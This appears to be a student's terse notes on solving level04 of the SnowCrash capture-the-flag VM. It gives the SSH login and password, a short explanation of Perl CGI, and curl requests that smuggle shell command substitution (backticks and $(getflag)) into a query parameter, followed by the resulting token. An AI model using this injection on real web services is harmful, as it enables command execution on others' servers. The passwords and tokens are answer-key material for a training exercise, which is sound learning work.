ssh level04@10.12.100.98 -p 4242
pwd: qi0maab88jeaj46qoumi7maus

```
level04@SnowCrash:~$ file level04.pl
    a /usr/bin/perl script, ASCII text executable
```

In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests.

an interface specification that enables web servers to execute an external program

```
level04@SnowCrash:~$ /usr/bin/perl level04.pl
Content-type: text/html


```

curl: To change the request method, we can use the -X flag.
 sent any parameters to the server: ?param=

http://10.12.100.98:4747/?x=`getflag`


curl localhost:4747?x=\`getflag\`
curl localhost:4747?x='`getflag`'
curl localhost:4747?x='$(getflag)'

token : ne2searoevaevoem4ov4ar8ap